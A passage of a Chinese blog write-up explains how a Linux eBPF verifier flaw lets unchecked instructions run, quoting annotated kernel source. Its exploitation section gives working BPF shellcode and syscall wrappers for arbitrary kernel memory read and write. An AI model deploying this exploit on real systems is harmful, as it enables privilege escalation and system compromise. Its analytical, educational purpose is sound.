<p>通过BPF_OP获取指令的opcode,这条指令的opcode是MOV,并且使用的是BPF_K,也就是立即数,所以最终把CONST_IMM == 8赋值给regs[BPF_REG_2].type,insn-&gt;imm == -1 赋值给regs[BPF_REG_2].imm,<br>注意:这里需要留意的一点就是insn-&gt;imm和regs[insn-&gt;dst_reg].imm都属于有符号32位。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> reg_state &#123;</div><div class="line">    <span class="keyword">enum</span> bpf_reg_type type;</div><div class="line">    <span class="keyword">union</span> &#123;</div><div class="line">        <span class="keyword">int</span> imm;                            <span class="comment">/* regs[BPF_REG_2].imm */</span></div><div class="line">        <span class="keyword">struct</span> bpf_map *map_ptr;</div><div class="line">    &#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>接着再来看对BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2)的解析,主要在check_cond_jmp_op函数中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div></pre></td><td class="code"><pre><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    err = check_cond_jmp_op(env, insn, &amp;insn_idx);</div><div class="line">        <span class="keyword">if</span> (err)</div><div class="line">            <span class="keyword">return</span> err;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_cond_jmp_op</span><span class="params">(<span class="keyword">struct</span> verifier_env *env,                                  <span class="comment">/* 该函数主要处理条件分支 */</span></span></span></div><div class="line">                 <span class="keyword">struct</span> bpf_insn *insn, <span class="keyword">int</span> *insn_idx)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">struct</span> reg_state *regs = env-&gt;cur_state.regs;</div><div class="line">    <span class="keyword">struct</span> verifier_state *other_branch;</div><div class="line">    u8 opcode = BPF_OP(insn-&gt;code);</div><div class="line">    <span class="keyword">int</span> err;</div><div class="line">    <span class="keyword">if</span> (opcode &gt; BPF_EXIT) &#123;</div><div class="line">        verbose(<span class="string">"invalid BPF_JMP opcode %x\n"</span>, opcode);</div><div class="line">        <span class="keyword">return</span> -EINVAL;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</div><div class="line">        <span class="keyword">if</span> (insn-&gt;imm != <span class="number">0</span>) &#123;</div><div class="line">            verbose(<span class="string">"BPF_JMP uses reserved fields\n"</span>);</div><div class="line">            <span class="keyword">return</span> -EINVAL;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">/* check src1 operand */</span></div><div class="line">        err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</div><div class="line">        <span class="keyword">if</span> (err)</div><div class="line">            <span class="keyword">return</span> err;</div><div class="line">        <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</div><div class="line">            verbose(<span class="string">"R%d pointer comparison prohibited\n"</span>,</div><div class="line">                insn-&gt;src_reg);</div><div class="line">            <span class="keyword">return</span> -EACCES;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0) &#123;</div><div class="line">            verbose(<span class="string">"BPF_JMP uses reserved fields\n"</span>);</div><div class="line">            <span class="keyword">return</span> -EINVAL;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* check src2 operand */</span></div><div class="line">    err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</div><div class="line">    <span class="keyword">if</span> (err)</div><div class="line">        <span class="keyword">return</span> err;</div><div class="line">    <span class="comment">/* detect if R == 0 where R was initialized to zero earlier */</span></div><div class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;                                                 <span class="comment">/* 检查条件是否成立 */</span></div><div class="line">        (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</div><div class="line">        regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;                                        <span class="comment">/* 如果目标寄存器的类型属于立即数 并且 目标寄存器的立即数与当前立即数一致 那么直接进入恒等模式 */</span></div><div class="line">        regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</div><div class="line">        <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</div><div class="line">            <span class="comment">/* if (imm == imm) goto pc+off;</span></div><div class="line">             * only follow the goto, ignore fall-through</div><div class="line">             */</div><div class="line">            *insn_idx += insn-&gt;off;</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;                                                                        <span class="comment">/* 因为op等于JNE,所以从这里进入,然后直接返回0 */</span></div><div class="line">            <span class="comment">/* if (imm != imm) goto pc+off;</span></div><div class="line">             * only follow fall-through branch, since</div><div class="line">             * that's where the program will go</div><div class="line">             */</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    other_branch = push_stack(env, *insn_idx + insn-&gt;off + <span class="number">1</span>, *insn_idx);               <span class="comment">/* 若当前条件无法确定跳转,那么会把第二条分支临时保存起来 后续若遇到exit指令 就pop出来第二条分支进行模拟执行 */</span></div><div class="line">    <span class="keyword">if</span> (!other_branch)</div><div class="line">        <span class="keyword">return</span> -EFAULT;</div><div class="line">    <span class="comment">/* detect if R == 0 where R is returned value from bpf_map_lookup_elem() */</span></div><div class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</div><div class="line">        insn-&gt;imm == <span class="number">0</span> &amp;&amp; (opcode == BPF_JEQ ||</div><div class="line">                   opcode == BPF_JNE) &amp;&amp;</div><div class="line">        regs[insn-&gt;dst_reg].type == PTR_TO_MAP_VALUE_OR_NULL) &#123;</div><div class="line">        <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</div><div class="line">            <span class="comment">/* next fallthrough insn can access memory via</span></div><div class="line">             * this register</div><div class="line">             */</div><div class="line">            regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</div><div class="line">            <span class="comment">/* branch targer cannot access it, since reg == 0 */</span></div><div class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</div><div class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].imm = <span class="number">0</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</div><div class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;</div><div class="line">            regs[insn-&gt;dst_reg].imm = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</div><div class="line">        verbose(<span class="string">"R%d pointer comparison prohibited\n"</span>, insn-&gt;dst_reg);</div><div class="line">        <span class="keyword">return</span> -EACCES;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</div><div class="line">           (opcode == BPF_JEQ || opcode == BPF_JNE)) &#123;</div><div class="line">        <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</div><div class="line">            <span class="comment">/* detect if (R == imm) goto</span></div><div class="line">             * and in the target state recognize that R = imm</div><div class="line">             */</div><div class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</div><div class="line">            other_branch-&gt;regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="comment">/* detect if (R != imm) goto</span></div><div class="line">             * and in the fall-through state recognize that R = imm</div><div class="line">             */</div><div class="line">            regs[insn-&gt;dst_reg].type = CONST_IMM;</div><div class="line">            regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (log_level)</div><div class="line">        print_verifier_state(env);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>check_cond_jmp_op函数主要用来处理分支语句(BPF_JEQ,BPF_JNE),但是因为这里是立即数之间做比较,如果两个立即数相等就会进入恒等情况,直接退出check_cond_jmp_op函数,因为内核认为这是恒等情况永远都会成立,所以也就没有执行保存分支2到临时栈中的代码(push_stack函数),如果我们在条件成立的情况下接着执行BPF_JMP|BPF_EXIT指令,那么内核就会直接跳出大循环,结束安全检查。<br>看看do_check中BPF_EXIT指令的处理代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</div><div class="line">            <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</div><div class="line">            insn-&gt;imm != <span class="number">0</span> ||</div><div class="line">            insn-&gt;src_reg != BPF_REG_0 ||</div><div class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</div><div class="line">                    verbose(<span class="string">"BPF_EXIT uses reserved fields\n"</span>);</div><div class="line">                    <span class="keyword">return</span> -EINVAL;</div><div class="line">                &#125;</div><div class="line">                <span class="comment">/* eBPF calling convetion is such that R0 is used</span></div><div class="line">                 * to return the value from eBPF program.</div><div class="line">                 * Make sure that it's readable at this time</div><div class="line">                 * of bpf_exit, which means that program wrote</div><div class="line">                 * something into it earlier</div><div class="line">                 */</div><div class="line">                err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</div><div class="line">                <span class="keyword">if</span> (err)</div><div class="line">                    <span class="keyword">return</span> err;</div><div class="line">                <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</div><div class="line">                    verbose(<span class="string">"R0 leaks addr as return value\n"</span>);</div><div class="line">                    <span class="keyword">return</span> -EACCES;</div><div class="line">                &#125;</div><div class="line">process_bpf_exit:</div><div class="line">                insn_idx = pop_stack(env, &amp;prev_insn_idx);                      <span class="comment">/* 弹出保存在零时栈中的分支 */</span></div><div class="line">                <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;                                             <span class="comment">/* 如果pop_stack返回值小于0 */</span></div><div class="line">                    <span class="keyword">break</span>;                                                      <span class="comment">/* 跳出大循环 */</span></div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    do_print_state = <span class="literal">true</span>;                                      <span class="comment">/* 否则设置状态为true */</span></div><div class="line">                    <span class="keyword">continue</span>;                                                   <span class="comment">/* 并结束本次循环 */</span></div><div class="line">                &#125;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pop_stack</span><span class="params">(<span class="keyword">struct</span> verifier_env *env, <span class="keyword">int</span> *prev_insn_idx)</span>              <span class="comment">/* 弹出零时栈中的分支 */</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">struct</span> verifier_stack_elem *elem;</div><div class="line">    <span class="keyword">int</span> insn_idx;</div><div class="line">    <span class="keyword">if</span> (env-&gt;head == <span class="literal">NULL</span>)                                                      <span class="comment">/* 若env-&gt;head为空,那么返回-1 */</span></div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    <span class="built_in">memcpy</span>(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, <span class="keyword">sizeof</span>(env-&gt;cur_state));</div><div class="line">    insn_idx = env-&gt;head-&gt;insn_idx;</div><div class="line">    <span class="keyword">if</span> (prev_insn_idx)</div><div class="line">        *prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;</div><div class="line">    elem = env-&gt;head-&gt;next;</div><div class="line">    kfree(env-&gt;head);</div><div class="line">    env-&gt;head = elem;</div><div class="line">    env-&gt;stack_size--;</div><div class="line">    <span class="keyword">return</span> insn_idx;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>因为前面JNE判断语句结果为恒等,所以并没有对分支2进行入栈备份,导致在执行BPF_EXIT操作后,内核打算执行pop_stack函数来获取分支2时因为env-&gt;head为空,所以返回-1,而又因为pop_stack的返回值为-1,内核以为检查完毕了,所以直接执行break退出了for大循环,结束了对用户指令的检查操作。<br>可以看到内核在模拟执行时只检查了4条代码就退出了检查<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_DISABLE_VERIFIER()                                                       \</span></div><div class="line">    BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF),             <span class="comment">/* r2 = (u32)0xFFFFFFFF   */</span>   \</div><div class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2),   <span class="comment">/* if (r2 == -1) &#123;        */</span>   \</div><div class="line">    BPF_MOV64_IMM(BPF_REG_0, 0),                      <span class="comment">/*   exit(0);             */</span>   \</div><div class="line">    BPF_EXIT_INSN()                                   <span class="comment">/* &#125;                      */</span>   \</div></pre></td></tr></table></figure></p>
<p>然后再来看实际执行的情况：<br>实际执行调用链：vfs_write -&gt; new_sync_write -&gt; sock_write_iter -&gt; sock_sendmsg -&gt; sock_sendmsg_nosec -&gt; unix_dgram_sendmsg -&gt; sk_filter -&gt; bpf_prog_run_save_cb -&gt; __bpf_prog_run</p>
<p>函数__bpf_prog_run用做实际解析并执行指令,该函数中有一个大的跳转表(jumptable),通过把每条指令的insn-&gt;code成员作为跳转表的索引值,跳转到需要执行的分支处对不同的指令做处理<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select_insn:</div><div class="line">    <span class="keyword">goto</span> *jumptable[insn-&gt;code];</div></pre></td></tr></table></figure></p>
<p>我们主要关注的是以下两条分支,对应着用户层传入的前两条指令<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[BPF_ALU | BPF_MOV | BPF_K] = &amp;&amp;ALU_MOV_K,</div><div class="line">[BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K,</div></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ALU_MOV_K:</div><div class="line">        DST = (u32) IMM;                <span class="comment">/*#define DST   regs[insn-&gt;dst_reg] --&gt;  u64 regs[MAX_BPF_REG] &lt;- (u32)IMM */</span></div><div class="line">        CONT;</div></pre></td></tr></table></figure>
<p>实际解析BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF)指令时会把有符号32位的IMM(insn-&gt;imm)强转为无符号32型,并赋值给无符号64位的DST(regs[insn-&gt;dst_reg]),此时DST==0x00000000FFFFFFFF<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">JMP_JNE_K:                              <span class="comment">/* 判断当前指令立即数是否与目标寄存器一致  */</span></div><div class="line">        <span class="keyword">if</span> (DST != IMM) &#123;               <span class="comment">/* 因为DST在上条指令被赋值为了u32类型的0xFFFFFFFF,而本次IMM为无符号64位的0xFFFFFFFFFFFFFFFF,所以不一致*/</span></div><div class="line">            insn += insn-&gt;off;          <span class="comment">/* 当前指令 + 当前指令的偏移参数 = 下条需要执行指令的位置 */</span></div><div class="line">            CONT_JMP;                   <span class="comment">/* #define CONT_JMP (&#123; insn++; goto select_insn; &#125;) */</span></div><div class="line">        &#125;</div><div class="line">        CONT;</div></pre></td></tr></table></figure></p>
<p>在解析BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2)指令时,因为DST属于无符号64位类型,比较时会把有符号32位的IMM(insn-&gt;imm)隐式转为无符号64位(0xFFFFFFFFFFFFFFFF),而DST最开始被赋值为0x00000000FFFFFFFF所以比较的结果肯定是不相等<br>分析到这里我们可以知道模拟执行时JNE比较结果为恒等,而实际执行是JNE比较结果却为不等,因为实际执行的结果不等,所以会跳转到分支2的位置去接着执行,而分支2在模拟执行时是没有被检查的,所以我们可以把分支2构造为我们用来提权的代码,这样就绕过了内核的安全检查,执行任何我们想执行的代码了。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h2><p>现在我们能够让内核执行我们注入的任何代码了，那么又如何进行提权呢？<br>我们可以给内核注入一段shellcode，然后创建一个bpf_map，因为bpf_map是内核层与应用层共享数据用的，所以我们可以在用户层使用bpf_API来修改bpf_map中的值，然后使用writemsg函数触发内核去执行我们注入的shellcode，当执行完前两条指令后会调转到指令5去执行，shellcode根据bpf_map中不同的值去执行不同的操作。<br>首先我们需要通过系统调用__NR_bpf，cmd为BPF_MAP_CREATE来创建一个bpf_map，设置该map最大元素个数为3，第一个元素为操作指令，第二个元素为读写的地址，第三个元素为存放读到的内容或写入数据，这样就组成了一条控制指令：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">shellcode：</div><div class="line">#define BPF_DISABLE_VERIFIER()                                                       \</div><div class="line">        BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF),                      /* r2 = (u32)0xFFFFFFFF   */   \</div><div class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2),          /* if (r2 == -1) &#123;             */   \</div><div class="line">        BPF_MOV64_IMM(BPF_REG_0, 0),                                    /*   exit(0);                    */   \</div><div class="line">        BPF_EXIT_INSN()                                                           /* &#125;        </div><div class="line"></div><div class="line">#define BPF_MAP_GET(idx, dst)                                                        \</div><div class="line">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                      /* r1 = r9                */   \   /* r1指向bpf_map句柄 */</div><div class="line">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                    /* r2 = fp                */   \   </div><div class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                    /* r2 = fp - 4            */   \  /* r2 指向idx 表示需要获取的第idx个元素 */</div><div class="line">        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                     /* *(u32 *)(fp - 4) = idx */   \</div><div class="line">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \  /* static u64 bpf_map_lookup_elem(u64 r1, u64 r2, u64 r3, u64 r4, u64 r5) */</div><div class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                      /* if (r0 == 0)           */   \   /* 如果map_lookup_elem的返回值为0,则退出 */</div><div class="line">        BPF_EXIT_INSN(),                                                          /*   exit(0);             */   \</div><div class="line">        BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)                  /* r_dst = *(u64 *)(r0)   */    /* 把第idx个元素的value写入到对应的寄存器中 */</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">/*-------我们注入的shellcode-------------*/</div><div class="line">        BPF_DISABLE_VERIFIER</div><div class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, -16),   /* *(fp - 16) = r1       */        /* BPF的BPF_REG_10 指向内核栈帧 */    /*-------------------shellcode的开始------------------------*/</div><div class="line">        BPF_LD_MAP_FD(BPF_REG_9, mapfd),                            /* 把bpf_map句柄赋值给BPF_REG_9 */</div><div class="line">        BPF_MAP_GET(0, BPF_REG_6),                                       /* r6 = op               */         /* 获取map元素1中的op --&gt; 操作码             */</div><div class="line">        BPF_MAP_GET(1, BPF_REG_7),                                       /* r7 = address       */         /* 获取map元素2中的addr --&gt; 需要读写地址 */</div><div class="line">        BPF_MAP_GET(2, BPF_REG_8),                                       /* r8 = value           */         /* 获取map元素3中的value --&gt; 存放读写的内容 */</div><div class="line">        /* store map slot address in r2 */                </div><div class="line">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),                   /* r2 = r0                  */        /* 让r2 指向 map元素3中的value 用作返回值*/</div><div class="line">        BPF_MOV64_IMM(BPF_REG_0, 0),                                /* r0 = 0  for exit(0)   */</div><div class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 2),                    /* if (op == 0) 不相等就跳过下面2条指令       */                                         /* opcode == 0 表述获取内核栈帧 */</div><div class="line">        /* get fp */</div><div class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),    /* *(r2 - 0) = r10     bpf中r10指向内核栈帧     */</div><div class="line">        BPF_EXIT_INSN(),</div><div class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 3),                   /* else if (op == 1) 不相等就跳过下面3条指令    */                                      /* opcode == 1 表示获取skbuff的值 */</div><div class="line">        /* get skbuff */</div><div class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_10, -16),    /* r3 = *(r10 -16)   get skbuff */</div><div class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),         /* *(r2 + 0) = r3*/  /* 把结果(r3) 写入到 r2指向的 map-3-value*/</div><div class="line">        BPF_EXIT_INSN(),</div><div class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 2, 3),                      /* else if (op == 2) 不相等就跳过下面3条指令     */                                  /* opcode == 2 表示执行读操作 */</div><div class="line">        /* read */</div><div class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0),        /* 读操作    r7 == map-2-addr, 获取内核地址中的值 赋值给r3*/</div><div class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),        /* 把结果(r3) 写入到 r2指向的 map-3-value*/</div><div class="line">        BPF_EXIT_INSN(),</div><div class="line">        /* write */</div><div class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),        /* 写操作 */                                                                                        /* opcode != 1 &amp;&amp; opcode != 2 &amp;&amp; opcode !=0 那么就执行写操作 */</div><div class="line">        BPF_EXIT_INSN(),</div></pre></td></tr></table></figure></p>
<p>通过系统调用_NR_bpf，cmd为BPF_MAP_UPDATE_ELEM的方式去修改map中key对应的value，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span>&#123;</div><div class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;</div><div class="line">        .map_fd = fd,</div><div class="line">        .key = ptr_to_u64(key),</div><div class="line">        .value = ptr_to_u64(value),</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">update_elem</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">unsigned</span> <span class="keyword">long</span> value)</span> </span>&#123;                            <span class="comment">/* 最底层封装的任意读写 cc控制 */</span></div><div class="line">    <span class="keyword">if</span> (bpf_update_elem(mapfd, &amp;key, &amp;value, <span class="number">0</span>)) &#123;</div><div class="line">        fail(<span class="string">"bpf_update_elem failed '%s'\n"</span>, strerror(errno));</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>通过系统调用_NR_bpf，cmd为BPF_MAP_LOOKUP_ELEM的方式去获取指定key的value，达到泄漏内核数据的效果<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *key, <span class="keyword">void</span> *value, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> flags)</span></span>&#123;</div><div class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;</div><div class="line">        .map_fd = fd,</div><div class="line">        .key = ptr_to_u64(key),</div><div class="line">        .value = ptr_to_u64(value),</div><div class="line">        .flags = flags,</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));            <span class="comment">/* 获取key对应value的值 */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span>  <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> value;</div><div class="line">    <span class="keyword">if</span> (bpf_lookup_elem(mapfd, &amp;key, &amp;value)) &#123;                                    <span class="comment">/* 信息泄漏 根据传入的key获取value */</span></div><div class="line">        fail(<span class="string">"bpf_lookup_elem failed '%s'\n"</span>, strerror(errno));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> value;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
